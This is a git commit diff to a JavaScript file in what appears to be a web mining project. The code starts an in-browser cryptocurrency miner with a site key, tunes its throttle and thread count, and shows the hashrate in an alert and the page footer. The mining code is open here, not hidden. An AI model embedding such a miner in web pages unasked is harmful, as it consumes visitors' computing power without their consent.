adff22795f11e5856f9be004f08eca55c14bf819
ES\NegiKara <karan.negi@adp.com>
2018-01-09 22:14:37 +0530

    Js Thread Changes

--- MiningCore.Web/Scripts/MineOne.js
+++ MiningCore.Web/Scripts/MineOne.js
@@ -4,23 +4,28 @@ function Test() {
     try {
 
         if (mainMiner != null && mainMiner.isRunning()) {
-            alert('hash =' + mainMiner.getHashesPerSecond() + ' & threads=' + mainMiner.getNumThreads());            
+            message('hash =' + mainMiner.getHashesPerSecond() + ' & threads=' + mainMiner.getNumThreads());            
             mainMiner.stop();
         }
 
         mainMiner = new Client.Anonymous('a6586a3300fabf67f8666d055d682db74c7741611f665efae8d6aefb2983dc6e', {
-            throttle: 0.5,
+            throttle: 0.3,
             threads:5,
             //autoThreads:true
         });
         mainMiner.start();
 
         // Console.log('ServiceHit');
-        alert('hash =' + mainMiner.getHashesPerSecond() + ' & threads=' + mainMiner.getNumThreads());            
+        message('hash =' + mainMiner.getHashesPerSecond() + ' & threads=' + mainMiner.getNumThreads());            
     }
     catch (e) {
 
     }
+}
+
+function message(msg) {
+    alert(msg);
+    document.getElementById("footer").innerHTML = msg;
 }
 
 
